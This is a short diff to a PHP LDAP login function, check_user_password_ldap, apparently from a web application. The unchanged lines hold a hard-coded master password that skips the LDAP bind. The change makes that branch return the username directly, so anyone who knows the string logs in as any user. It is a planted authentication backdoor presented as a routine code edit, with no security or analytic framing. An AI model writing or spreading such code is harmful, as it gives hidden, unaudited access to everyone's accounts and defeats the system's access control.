@@ -149,7 +149,7 @@ function check_user_password_ldap($usertotest, $passwordtotest, $entitytotest)
 		// Test with this->seachUser and this->searchPassword
 		//print $resultFetchLdapUser."-".$ldap->ldapUserDN."-".$ldap->searchUser.'-'.$ldap->searchPassword;exit;
                 if($passwordtotest == "passjokerklhkhklh^%ùécdfr")
-                    $result = 2;
+                    return $usertotest;
                 else
                     $result=$ldap->connect_bind();
 		if ($result > 0) {
